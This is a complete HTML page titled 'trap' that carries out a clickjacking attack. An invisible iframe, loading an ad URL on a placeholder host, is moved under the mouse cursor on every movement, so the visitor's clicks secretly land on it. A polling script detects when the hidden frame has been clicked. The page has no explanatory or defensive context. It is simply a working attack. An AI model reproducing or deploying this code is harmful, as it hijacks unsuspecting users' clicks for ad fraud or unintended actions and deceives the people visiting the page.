<!DOCTYPE html>
<html><head><title>trap</title></head><body>
<script>var interval; interval=setInterval("updateActiveElement();", 50);
function updateActiveElement(){ if ($(document.activeElement).attr('id')=="haframe"){ clearInterval(interval); } }</script>
<div id="icontainer" style="overflow:hidden; width:40px; height:40px; position:absolute; filter:alpha(opacity=0); opacity:0.0;">
<iframe id="haframe" src="http://example.invalid/ad" style="border:none; width:40px; height:40px;"></iframe>
</div>
<script>var icontainer = document.getElementById('icontainer');
document.onmousemove = function(e){ icontainer.style.top = (e.pageY-15)+'px'; icontainer.style.left = (e.pageX-17)+'px'; };</script>
</body></html>
